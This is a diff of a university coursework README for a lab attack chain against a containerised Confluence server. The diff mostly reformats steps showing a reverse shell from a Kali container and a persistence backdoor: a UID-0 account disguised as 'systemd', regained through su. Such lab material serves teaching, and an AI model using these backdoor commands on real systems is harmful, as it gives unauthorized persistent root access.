@@ -32,7 +32,7 @@
 kernelCommandLine = "sysctl.vm.max_map_count=262144"
 ```
 
-## Architecture (current, TBC)
+## Architecture
 View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0ba2-476d-b156-56c140aab2bd/edit?viewport_loc=-393%2C-96%2C2219%2C979%2C0_0&invitationId=inv_5979f7e6-9a73-4b7e-b835-07418f9dae9d#)
 
 <img src="https://user-images.githubusercontent.com/1593214/197392810-d5950ac7-472b-47ed-a0f6-2cdf622235cc.png" width="1024">
@@ -142,17 +142,20 @@ Available configured attacks: `initialaccess` `privesc` `persistence` `credentia
 
     <img src="https://user-images.githubusercontent.com/1593214/197329877-ef4c952d-2de8-49e2-84ab-fde8a30edea3.png" width="512">
 
-Steps:
-  ```console
-  HOST-MACHINE@HOST $ docker exec -it kali /bin/bash
-  root@kali # cd /tmp/1_InitialAccess
-  root@kali # bash runme.sh
-  ```
-  ```console
-  confluence@confluence:/opt/atlassian/confluence/bin $
-  ```
+##### Proof-of-concept 
 ```console
-HOST-MACHINE@HOST $ vagrant provision --provision-with initialaccess 
+HOST-MACHINE@HOST $ vagrant provision --provision-with initialaccess
+==> kali: Running provisioner: initialaccess (shell)...
+	...
+    kali: confluence@confluence:/opt/atlassian/confluence/bin$ exit
+HOST-MACHINE@HOST $
+```
+##### Reverse Shell access
+```console
+HOST-MACHINE@HOST $ docker exec -it kali /bin/bash
+root@kali # cd /tmp/1_InitialAccess
+root@kali # bash runme.sh
+confluence@confluence:/opt/atlassian/confluence/bin $
 ```
 
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
@@ -202,21 +205,21 @@ root
 - After gaining root access via privilege escalation, create root privileges account.
 - Allows attacker to regain root privileges by accessing the account.
 
-    ```
-    root@confluence:/tmp# useradd -ou 0 -g 0 systemd
-    root@confluence:/tmp# chpasswd <<<"systemd:systemd"
-    ```
-    Regain
-    ```
-    confluence@confluence:/tmp$ echo "import pty; pty.spawn('/bin/bash')" >/tmp/shell.py
-    confluence@confluence:/tmp$ python /tmp/shell.py
-    bash: /root/.bashrc: Permission denied
-    confluence@confluence:/tmp$ su systemd
-    Password: systemd
-    # whoami
-    whoami
-    root
-    ```
+```console
+root@confluence:/tmp# useradd -ou 0 -g 0 systemd
+root@confluence:/tmp# chpasswd <<<"systemd:systemd"
+```
+Regain
+```console
+confluence@confluence:/tmp$ echo "import pty; pty.spawn('/bin/bash')" >/tmp/shell.py
+confluence@confluence:/tmp$ python /tmp/shell.py
+bash: /root/.bashrc: Permission denied
+confluence@confluence:/tmp$ su systemd
+Password: systemd
+# whoami
+whoami
+root
+```
 	
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with persistence 
